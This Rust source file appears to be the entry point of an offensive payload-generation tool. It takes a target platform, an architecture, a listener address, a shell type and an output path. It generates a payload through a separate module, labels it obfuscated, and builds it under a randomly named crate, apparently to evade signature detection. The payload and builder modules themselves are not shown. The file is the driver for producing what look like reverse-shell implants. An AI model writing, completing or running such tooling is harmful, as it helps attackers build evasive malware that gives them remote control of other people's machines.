mod builder;
mod payloads;
mod elmoargs;
mod supporter;
use random_string::generate as gen;
use rand::Rng;
use std::str;
use std::process::exit;

extern crate base64;

fn obf_payload_crate() -> String {
    let charset: &str = "abcdefghijklmnopqrstuvwxyz";
    let num: usize = rand::thread_rng().gen_range(2..21);
    return gen(num, charset);
}

fn banner() -> String {
    let bytes = base64::decode("").unwrap();
    let message = str::from_utf8(&bytes).unwrap();
    return message.to_string();
}

fn main() {
    println!("\n{}", banner());
    let args = elmoargs::getargs();
    let argsvec: Vec<&str> = args.split_whitespace().collect();
    let platform: String = argsvec[0].to_string(); // Platform
    let architecture: String = argsvec[1].to_string(); // Architecture
    let listener: String = argsvec[2].to_string(); // Listener
    let shell: String = argsvec[3].to_string(); // Shell
    let output: String = argsvec[4].to_string(); // Output file

    println!("Selecting supporting build option...");
    let platform_combo = supporter::check_supported(&architecture, &platform);
    if platform_combo == "" {
        println!("Invalid Platform and Architecture combination!\nPlease provide a correct combination...");
        exit(0);
    }
    println!("Selected option: {}", platform_combo);
    println!("\n{}\n", "Obfucated Payload...");
    let payload_result = payloads::payload_generate(&listener, &shell, &platform);
    println!("{}", payload_result);
    println!("\n{}\n", "Building Payload...");
    builder::build(&payload_result, &obf_payload_crate(), &platform_combo, &output);
}